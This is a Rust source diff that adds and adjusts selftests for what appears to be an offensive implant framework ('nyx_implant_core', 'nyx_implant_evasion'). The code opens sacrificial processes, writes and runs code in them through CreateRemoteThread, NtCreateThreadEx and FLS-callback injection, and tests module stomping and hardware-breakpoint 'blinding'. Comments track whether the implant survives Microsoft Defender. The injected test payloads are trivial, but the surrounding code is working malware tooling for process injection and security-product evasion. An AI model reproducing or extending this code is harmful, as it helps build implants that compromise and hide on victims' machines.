+        wpm: unsafe { core::mem::transmute(wpm) },
+        crt: unsafe { core::mem::transmute(crt) },
+        wait: unsafe { core::mem::transmute(wait) },
+        gec: unsafe { core::mem::transmute(gec) },
+        gle: unsafe { core::mem::transmute(gle) },
+        close: unsafe { core::mem::transmute(close) },
+        ntcrt: ea(ntdll, b"NtCreateThreadEx").map(|a| unsafe { core::mem::transmute(a) }),
+        rcut: ea(ntdll, b"RtlCreateUserThread").map(|a| unsafe { core::mem::transmute(a) }),
+        sleep,
+    };
+
+    let mut mask: u32 = 0;
+    // mov eax, 0x1234 ; ret — exit code 0x1234 (proves the body ran).
+    const RET1234: [u8; 6] = [0xB8, 0x34, 0x12, 0x00, 0x00, 0xC3];
+
+    // crt_exp: kernel32 CRT, kernel32!Sleep start.
+    let (text, created) = match unsafe { crt2_open_image(&fns, CRT3_SLEEPER, 0x102A) } {
+        None => {
+            mask |= 1 << 3; // sleeper spawn/open failed — deploy issue
+            (String::from("spawn/open failed"), false)
+        }
+        Some((proc, h)) => {
+            let r = unsafe { crt2_run_crt(&fns, h, fns.sleep as *mut _) };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt3.crt_exp", &text);
+    if created {
+        mask |= 1 << 0;
+    }
+
+    // crt_priv: kernel32 CRT, private RX start.
+    let (text, created) = match unsafe { crt2_open_image(&fns, CRT3_SLEEPER, 0x102A) } {
+        None => (String::from("spawn/open failed"), false),
+        Some((proc, h)) => {
+            let region = unsafe { crt2_stage(&fns, h, &RET1234) };
+            let r = if region.is_null() {
+                (String::from("stage failed"), false)
+            } else {
+                let r = unsafe { crt2_run_crt(&fns, h, region) };
+                unsafe { crt2_free(&fns, h, region) };
+                r
+            };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::selftests::write_marker("nyx_g6_crt3.crt_priv", &text);
+    if created {
+        mask |= 1 << 1;
+    }
+
+    // fls: the full FLS callback inject against the x64 sleeper (gate forced
+    // ON, restored after). fls.rs's Prism refusal must let this through —
+    // the target is a peer x64-emulated process.
+    let prev_gate = crate::fls::set_fls_inject_enabled(true);
+    let text = match unsafe { crt2_open_image(&fns, CRT3_SLEEPER, 0x102A) } {
+        None => String::from("spawn/open failed"),
+        Some((proc, h)) => {
+            // The open mask 0x002A (CREATE_THREAD|VM_OP|VM_WRITE) is exactly
+            // what fls_callback_inject needs; the proc guard stays un-resumed
+            // so drop terminates the sleeper (the 0xC3 probe returns harmlessly).
+            let r = match unsafe { crate::fls::fls_callback_inject(h, &[0xC3]) } {
+                Ok(()) => {
+                    mask |= 1 << 2;
+                    String::from("fls callback inject ok (x64 target)")
+                }
+                Err(e) => String::from(e),
+            };
+            let _ = unsafe { (fns.close)(h) };
+            core::mem::drop(proc);
+            r
+        }
+    };
+    crate::fls::set_fls_inject_enabled(prev_gate);
+    crate::selftests::write_marker("nyx_g6_crt3.fls", &text);
+
+    unsafe { exit(mask) };
+}
+
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hostinfo() {
@@ -1473,7 +2240,13 @@ pub unsafe extern "system" fn nyx_selftest_blind_provider() {
 // runs our code (proving the overwrite + remote execute path end to end).
 // Bits: 0 = create_sacrificial Ok, 1 = module_stomp returned Ok (full real stomp
 //       path completed without the implant dying), 2 = reached exit (implant not
-//       killed by Defender before here), 3 = modulestomp armed confirmed.
+//       killed by Defender before here), 3 = modulestomp armed confirmed,
+//       4 = SKIP FLAG (not a pass): module_stomp died at the cross-arch
+//           CreateRemoteThread under x64-on-ARM64 emulation — VM evidence
+//           2026-08-24 (nyx_g6_inject_armed.resp = "CreateRemoteThread", the
+//           inject.rs remote_load_library CRT step; the cover DLL itself was
+//           verified PRESENT on the Win11 24H2 VM). Same Prism root cause as
+//           the FLS refusal; expected Prism exit = 0b11101 = 0x1D.
 // ⚠️ Defender RTP is ON but the test dir is excluded, so the implant survives;
 // the sacrificial notepad MAY still be flagged/killed — we report that honestly.
 // ============================================================================
@@ -1521,7 +2294,21 @@ pub unsafe extern "system" fn nyx_selftest_inject_armed() {
                 Ok(_proc) => {
                     mask |= 1 << 1; // full REAL stomp path returned Ok
                 }
-                Err(_) => {}
+                Err(e) => {
+                    // g6 diagnosis: persist which module_stomp step failed.
+                    crate::selftests::write_marker("nyx_g6_inject_armed.resp", e);
+                    // bit4 SKIP FLAG: under x64-on-ARM64 emulation the cover
+                    // load dies at cross-arch CreateRemoteThread (inject.rs
+                    // remote_load_library) — an expected Prism environment
+                    // limit (same root cause as the fls.rs refusal), not a
+                    // module-stomp bug. Precise match: only the proven Prism
+                    // failure point earns the skip flag (2026-08-24).
+                    if e == "CreateRemoteThread"
+                        && nyx_implant_core::syscalls::is_x64_emulated_on_arm64()
+                    {
+                        mask |= 1 << 4;
+                    }
+                }
             }
         }
         Err(_) => {}
@@ -2334,8 +3121,9 @@ pub fn write_marker(name: &str, content: &str) {
 }
 
 /// u32 → decimal String (no format! under no_std).
+/// `pub` (2026-08-21): fls.rs's selftest-only g6 diagnosis reuses it.
 #[cfg(feature = "selftest")]
-fn dec_u32(mut v: u32) -> String {
+pub fn dec_u32(mut v: u32) -> String {
     if v == 0 {
         return String::from("0");
     }
@@ -2409,8 +3197,9 @@ fn dec_i32(s: i32) -> String {
 }
 
 /// u32 → lowercase hex String (no format! under no_std). For NTSTATUS / code.
+/// `pub` (2026-08-21): fls.rs's selftest-only g6 diagnosis reuses it.
 #[cfg(feature = "selftest")]
-fn hex_u32(mut v: u32) -> String {
+pub fn hex_u32(mut v: u32) -> String {
     const HEX: &[u8; 16] = b"0123456789abcdef";
     let mut tmp = [0u8; 8];
     let mut i = tmp.len();
@@ -3210,7 +3999,18 @@ pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
             if !bytes.is_empty() {
                 diag_byte(bytes[0]);
             }
+            // g6 diagnosis: the full error string (diag_byte only keeps the
+            // first byte) — needed to classify Prism vs. code bug.
+            crate::selftests::write_marker("nyx_g6_hwbp_blind.err", e);
             nyx_implant_evasion::blind_hwbp::set_diag_enabled(false);
+            // 0xC1 = SKIP (2026-08-24): the blind_hwbp.rs up-front refusal
+            // under x64-on-ARM64 emulation is an intended environment gate
+            // (VM evidence: nyx_g6_hwbp_blind.err = "hwbp unsupported under
+            // x64-on-ARM64 emulation"), visibly distinct from a real
+            // add_hwbp failure (0xC0).
+            if e == "hwbp unsupported under x64-on-ARM64 emulation" {
+                exit(0xC1);
+            }
             exit(0xC0);
         }
     }
